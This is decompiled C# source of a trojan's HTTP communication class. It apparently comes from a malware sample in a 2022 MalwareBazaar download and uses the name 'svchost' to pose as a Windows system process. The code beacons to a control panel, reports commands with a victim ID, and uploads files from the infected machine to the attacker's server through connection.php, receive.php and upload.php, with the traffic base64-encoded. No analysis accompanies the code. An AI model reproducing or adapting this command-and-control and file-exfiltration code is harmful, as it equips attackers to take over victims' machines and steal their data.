// Decompiled with JetBrains decompiler
// Type: svchost.HTTPSocket.HTTP
// Assembly: svchost, Version=10.0.18362.1, Culture=neutral, PublicKeyToken=null
// MVID: 64EF29CB-BBE3-43C5-8FBF-9660E67757C5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-b33d569af5e490875d6473c6402797ddb4ce639bb1f1cf7f67698eeafa625f09.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Net;
using System.Text;

namespace svchost.HTTPSocket
{
  [OptionText]
  public class HTTP
  {
    public string Host;
    public string Data;
    public string Y;
    public string ID;

    public HTTP() => this.Y = "|BN|";

    public object Connect()
    {
      object obj;
      try
      {
        string s = this.ID + this.Y + this.Data;
        this._GET("connection.php?data=" + this.ENB(ref s));
        obj = (object) true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = (object) false;
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public string ENB(ref string s) => Convert.ToBase64String(Encoding.UTF8.GetBytes(s)).Split('=')[0].Replace("+", "-").Replace("/", "_");

    public string DEB(ref string s)
    {
      string s1 = s.Replace("-", "+").Replace("_", "/");
      switch (s1.Length % 4)
      {
        case 2:
          s1 += "==";
          break;
        case 3:
          s1 += "=";
          break;
      }
      return Encoding.UTF8.GetString(Convert.FromBase64String(s1));
    }

    public object _GET(string request)
    {
      object obj;
      try
      {
        obj = (object) new WebClient().DownloadString(this.Host + "/" + request);
      }
      catch (WebException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        obj = (object) ex.Message;
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public object _POST(string filename, string requst)
    {
      object obj;
      try
      {
        HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(this.Host + "/" + filename);
        byte[] bytes = new UTF8Encoding().GetBytes(requst);
        httpWebRequest.Method = "POST";
        httpWebRequest.ContentType = "application/x-www-form-urlencoded";
        httpWebRequest.ContentLength = (long) bytes.Length;
        using (Stream requestStream = httpWebRequest.GetRequestStream())
          requestStream.Write(bytes, 0, bytes.Length);
        obj = (object) httpWebRequest.GetResponse();
      }
      catch (WebException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        obj = (object) ex.Message;
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public object Send(string Command)
    {
      object obj;
      try
      {
        new WebClient().DownloadString(this.Host + "/receive.php?command=" + this.ENB(ref Command) + "&vicID=" + this.ENB(ref this.ID));
        obj = (object) true;
      }
      catch (WebException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        obj = (object) ex.Message;
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public object Upload(string Filepath)
    {
      object obj;
      try
      {
        new WebClient().UploadFile(this.Host + "/upload.php?id=" + this.ENB(ref this.ID), Filepath);
        obj = (object) true;
      }
      catch (WebException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        obj = (object) ex.Message;
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public object Log(string Type, string Message)
    {
      this.Send("NewLog" + this.Y + Type + this.Y + Message);
      return (object) true;
    }

    public object IsPanel(string PanelURL)
    {
      WebRequest webRequest1 = WebRequest.Create(new Uri(PanelURL));
      WebRequest webRequest2;
      object obj;
      try
      {
        webRequest1.GetResponse().Close();
        webRequest2 = (WebRequest) null;
        obj = (object) true;
      }
      catch (WebException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        webRequest2 = (WebRequest) null;
        obj = (object) false;
        ProjectData.ClearProjectError();
      }
      return obj;
    }
  }
}
